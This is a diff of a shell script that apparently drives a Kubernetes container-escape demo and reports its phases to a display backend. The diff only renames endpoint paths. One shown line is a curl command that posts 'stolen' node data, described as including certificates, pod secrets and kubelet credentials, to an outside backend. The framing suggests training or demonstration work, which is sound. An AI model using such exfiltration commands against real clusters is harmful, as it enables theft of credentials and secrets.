@@ -16,7 +16,7 @@ POD_NAME="${POD_NAME:-target-app}"
 # ── Event emitter ─────────────────────────────────────────────────────────────
 emit() {
   local phase=$1 severity=$2 title=$3 explanation=$4
-  curl -sf -X POST "$BACKEND_URL/events/internal" \
+  curl -sf -X POST "$BACKEND_URL/internal" \
     -H "Content-Type: application/json" \
     -d "{\"phase\":\"$phase\",\"severity\":\"$severity\",\"title\":\"$title\",\"explanation\":\"$explanation\"}" \
     || true  # Never let event emission fail the attack
@@ -177,7 +177,7 @@ emit "IMPACT" "CRITICAL" \
   "The container boundary no longer exists. Attacker can read and write the node filesystem directly including Kubernetes certificates, all pod secrets on this node, and kubelet credentials."
 
 # Send stolen data sample to backend for display in impact panel
-curl -sf -X POST "$BACKEND_URL/events/stolen-data" \
+curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
   -H "Content-Type: application/json" \
   -d "{\"scenario\":\"privilege-escalation\",\"data\":$(echo "$NODE_DATA" | jq -Rs .)}" \
   || true
